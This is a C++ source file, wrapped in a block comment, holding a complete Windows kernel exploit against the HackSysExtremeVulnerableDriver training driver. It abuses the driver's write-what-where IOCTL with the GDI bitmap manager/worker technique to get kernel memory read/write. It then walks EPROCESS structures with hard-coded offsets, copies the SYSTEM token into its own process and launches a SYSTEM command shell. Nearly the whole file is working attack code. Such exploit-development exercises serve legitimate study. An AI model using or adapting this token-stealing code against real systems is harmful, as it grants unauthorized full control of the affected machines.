/*
#include <iostream>
#include <string>

#include <Windows.h>
#include <winternl.h>

#include "helpers.h"


HBITMAP MANAGER_BITMAP;
HBITMAP WORKER_BITMAP;

int exploitWriteWhatWhere(unsigned long long what, unsigned long long where) {
	std::wstring deviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";

	void* deviceHandle = CreateFileW(deviceName.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		0);

	if (INVALID_HANDLE_VALUE == deviceHandle) {
		std::cout << "CreateFileW Failed" << std::endl;
		return -1;
	}

	WRITE_WHAT_WHERE input;
	input.What = (unsigned long long)&what;
	input.Where = where;

	DeviceIoControl(deviceHandle, WRITE_WHAT_WHERE_IOCTL_CODE, &input, 8, 0, 0, 0, 0);

	return 0;
}

void* getPebAddress() {
	void* peb;
	PROCESS_BASIC_INFORMATION basicInfo = { 0 };
	unsigned long returned = 0;
	NTQUERYINFORMATIONPROCESS NtQueryInformationProcess;
	*(FARPROC*)&NtQueryInformationProcess = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
	NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &basicInfo,
		sizeof(PROCESS_BASIC_INFORMATION), &returned);

	return basicInfo.PebBaseAddress;
}

void* leakSurfaceAddress(HBITMAP bmpHandle) {
	unsigned long long peb = (unsigned long long)getPebAddress();
	std::cout << "Found PEB at 0x" << std::hex << peb << std::endl;
	unsigned long long gdiSharedHandleTable = *(unsigned long long*)(peb + 0xF8);
	std::cout << "Found gdiSharedHandleTable at 0x" << std::hex << gdiSharedHandleTable << std::endl;
	unsigned long long entryOffset = ((unsigned int)bmpHandle & 0xFFFF) * 0x18;
	void* kernelAddress = (void*)*(unsigned long long*)(gdiSharedHandleTable + entryOffset);
	std::cout << "Found KernelAddress at 0x" << std::hex << kernelAddress << std::endl;
	return kernelAddress;
}

void createPrimitives() {
	char data[0x65];
	memset(data, 'A', 0x64);
	data[0x64] = '\x00';

	MANAGER_BITMAP = CreateBitmap(0x8, 0x8, 0x1, 32, &data);
	WORKER_BITMAP = CreateBitmap(0x8, 0x8, 0x1, 32, &data);

	std::cout << "Manager handle: 0x" << std::hex << MANAGER_BITMAP << std::endl;
	std::cout << "Worker handle: 0x" << std::hex << WORKER_BITMAP << std::endl;

	void* managerSurface = leakSurfaceAddress(MANAGER_BITMAP);
	void* workerSurface = leakSurfaceAddress(WORKER_BITMAP);

	std::cout << "Manager: 0x" << std::hex << managerSurface << std::endl;
	std::cout << "Worker: 0x" << std::hex << workerSurface << std::endl;

	unsigned long long workerPvScan0Address = (unsigned long long)workerSurface + 0x18 + 0x38;
	unsigned long long managerPvScan0Address = (unsigned long long)managerSurface + 0x18 + 0x38;

	exploitWriteWhatWhere(workerPvScan0Address, managerPvScan0Address);

	std::cout << "Exploited Write-What-Where" << std::endl;
}

unsigned long long readQword(unsigned long long address) {
	unsigned long long data = 0;
	SetBitmapBits(MANAGER_BITMAP, 8, &address);
	GetBitmapBits(WORKER_BITMAP, 8, &data);
	return data;
}

void writeQword(unsigned long long address, void* data) {
	SetBitmapBits(MANAGER_BITMAP, 8, &address);
	SetBitmapBits(WORKER_BITMAP, 8, data);
}

unsigned long long getNtoskrnlBase() {
	unsigned long long baseAddress = 0;
	unsigned long long ntAddress = readQword(0xffffffffffd00448) - 0x110000;
	unsigned long long signature = 0x00905a4d;
	unsigned long long searchAddress = ntAddress & 0xfffffffffffff000;

	while (true) {
		unsigned long long readData = readQword(searchAddress);

		if ((readData & 0x00000000FFFFFFFF) == signature) {
			baseAddress = searchAddress;
			break;
		}
		searchAddress = searchAddress - 0x1000;
	}

	return baseAddress;
}

unsigned long long PsInitialSystemProcess() {
	unsigned long long systemProcessAddress;
	unsigned long long kernelNtos = getNtoskrnlBase();
	std::cout << "ntoskrnl.exe Base: 0x" << std::hex << kernelNtos << std::endl;

	void* userNtos = LoadLibraryA("ntoskrnl.exe");

	systemProcessAddress = kernelNtos +
		((unsigned long long)GetProcAddress((HMODULE)userNtos, "PsInitialSystemProcess") - (unsigned long long)userNtos);

	std::cout << "System process is at 0x" << std::hex << systemProcessAddress << std::endl;
	return readQword(systemProcessAddress);
}

void elevatePrivileges() {
	unsigned long long systemProcess;
	unsigned long long currentProcess;
	void* systemToken;
	unsigned long pid;

	//unsigned long long tokenOffset = offsetof(_EPROCESS, Token);
	//unsigned long long activeProcessLinksOffset = offsetof(_EPROCESS, ActiveProcessLinks);
	//unsigned long long pidOffset = offsetof(_EPROCESS, UniqueProcessId);
	unsigned long long tokenOffset = 0x358;
	unsigned long long activeProcessLinksOffset = 0x2f0;
	unsigned long long pidOffset = 0x2e8;

	unsigned long currentPid = GetCurrentProcessId();
	systemProcess = PsInitialSystemProcess();
	std::cout << "Found system process at 0x" << std::hex << systemProcess << std::endl;
	systemToken = (void*)readQword(systemProcess + tokenOffset);
	std::cout << "Found system token at 0x" << std::hex << systemToken << std::endl;

	currentProcess = systemProcess;
	do {
		currentProcess = readQword(currentProcess + activeProcessLinksOffset) - activeProcessLinksOffset;
		pid = readQword(currentProcess + pidOffset);
	} while (pid != currentPid);

	std::cout << "Found current process at 0x" << std::hex << currentProcess << std::endl;

	writeQword(currentProcess + tokenOffset, &systemToken);
}

int main() {
	createPrimitives();
	elevatePrivileges();
	std::cout << "Enjoy system priviliges :-)" << std::endl;
	system("cmd.exe");


	int i = 0;
	std::cin >> i;
	std::cout << i;

	return 0;
}
*/